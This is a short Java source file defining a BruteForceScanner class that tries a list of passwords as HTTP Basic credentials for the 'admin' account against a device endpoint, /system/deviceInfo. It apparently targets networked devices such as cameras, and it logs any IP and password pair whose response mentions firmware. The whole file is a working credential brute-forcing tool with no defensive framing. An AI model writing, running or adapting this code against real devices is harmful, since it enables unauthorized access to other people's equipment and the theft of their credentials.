package scanner;

import lombok.Data;
import lombok.extern.slf4j.Slf4j;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.http.HttpClient;

import java.io.IOException;
import java.util.Base64;
import java.util.Objects;

@Data
@Slf4j
public class BruteForceScanner {

    private final String BRUTE = "http://%s/system/deviceInfo";
    private final HttpClient client = new HttpClient();

    public void brute(String ip, String[] passwords) {
        for (String pass : passwords) {
            String auth = new String(Base64.getEncoder().encode(String.format("admin:%s", pass).getBytes()));
            try (Response response = client.execute(String.format(BRUTE, ip), auth)) {
                ResponseBody responseBody = response.body();
                if (Objects.nonNull(responseBody)) {
                    String body = responseBody.string();
                    if (body.contains("firmware")) {
                        log.info(ip + " => admin:" + pass);
                        break;
                    }
                }
            } catch (IOException ignored) { }
        }
    }

}